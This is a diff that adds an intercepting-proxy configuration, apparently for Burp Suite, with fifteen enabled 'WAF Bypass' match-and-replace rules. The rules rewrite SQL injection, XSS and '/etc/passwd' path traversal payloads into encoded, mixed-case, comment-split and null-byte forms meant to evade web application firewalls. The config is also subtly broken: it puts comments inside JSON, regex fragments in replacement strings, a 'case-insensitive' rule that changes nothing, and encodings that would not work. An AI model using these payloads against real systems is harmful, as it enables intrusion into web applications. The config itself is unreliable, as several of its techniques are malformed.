@@ -1,0 +1,127 @@
+{
+    "proxy": {
+        "match_replace_rules": [
+            {
+                "comment": "WAF Bypass - Obfuscate SQL Injection Payload",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": ".*' OR '1'='1.*$",
+                "string_replace": ".*%27%20OR%20%271%27%3D%271.*$"  // SQLi payload with URL encoding
+            },
+            {
+                "comment": "WAF Bypass - Double URL Encoding for SQL Injection",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": ".*' OR '1'='1.*$",
+                "string_replace": ".*%2527%2520OR%2520%25271%2527%253D%25271.*$"  // Double URL encoding for SQL injection
+            },
+            {
+                "comment": "WAF Bypass - Case Insensitive SQL Injection",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": ".*' OR '1'='1.*$",
+                "string_replace": ".*'%20OR%20'1'%3D'1.*$"  // Case-insensitive SQL injection
+            },
+            {
+                "comment": "WAF Bypass - Comment Injection in SQL Injection",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": ".*' OR '1'='1.*$",
+                "string_replace": ".*'/**/OR/**/'1'%3D'1.*$"  // Adding comments to evade detection
+            },
+            {
+                "comment": "WAF Bypass - Use of Hex Encoding for XSS Payload",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "<script>alert(1)</script>",
+                "string_replace": "%3Cscript%3Ealert%281%29%3C%2Fscript%3E"  // XSS payload with hex encoding
+            },
+            {
+                "comment": "WAF Bypass - Use of Mixed Case for XSS Payload",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "<script>alert(1)</script>",
+                "string_replace": "<ScRiPt>aLeRt(1)</ScRiPt>"  // Mixed case to bypass WAF filters
+            },
+            {
+                "comment": "WAF Bypass - Base64 Encoding for XSS Payload",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "<script>alert(1)</script>",
+                "string_replace": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="  // Base64 encoded XSS payload
+            },
+            {
+                "comment": "WAF Bypass - Using %2f (Slash Encoding) for Path Traversal",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_url",
+                "string_match": "../etc/passwd",
+                "string_replace": "%2E%2E%2Fetc%2Fpasswd"  // URL encoded path traversal
+            },
+            {
+                "comment": "WAF Bypass - Using UTF-8 Encoding for Path Traversal",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_url",
+                "string_match": "../etc/passwd",
+                "string_replace": "%C2%2E%C2%2E%2Fetc%2Fpasswd"  // UTF-8 encoded path traversal
+            },
+            {
+                "comment": "WAF Bypass - Split SQL Injection Payload into Multiple Chunks",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": ".*' OR '1'='1.*$",
+                "string_replace": ".*'%20OR%20'%271%27%3D%271.*$"  // Fragmenting SQLi payload into multiple parts
+            },
+            {
+                "comment": "WAF Bypass - Using Null Byte Injection for Path Traversal",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_url",
+                "string_match": "../etc/passwd",
+                "string_replace": "../etc/passwd%00"  // Null byte injection to bypass WAF checks
+            },
+            {
+                "comment": "WAF Bypass - Encode SQLi Payload with Unicode",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": ".*' OR '1'='1.*$",
+                "string_replace": ".*%u0027%20OR%20%u0031%20%3D%20%u0031.*$"  // Unicode encoding for SQL injection
+            },
+            {
+                "comment": "WAF Bypass - Double Hash Encoding for XSS Payload",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "<script>alert(1)</script>",
+                "string_replace": "%2523%2523%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E"  // Double hashing encoding
+            },
+            {
+                "comment": "WAF Bypass - Use of DOM-based XSS to Evade Detection",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_parameter",
+                "string_match": "<script>alert(1)</script>",
+                "string_replace": "<img src=javascript:alert(1)>"  // DOM-based XSS bypass
+            },
+            {
+                "comment": "WAF Bypass - Use of Double URL Encoding for Path Traversal",
+                "enabled": true,
+                "is_simple_match": true,
+                "rule_type": "request_url",
+                "string_match": "../etc/passwd",
+                "string_replace": "%252E%252E%252Fetc%252Fpasswd"  // Double URL encoding path traversal
+            }
+        ]
+    }
+}
+
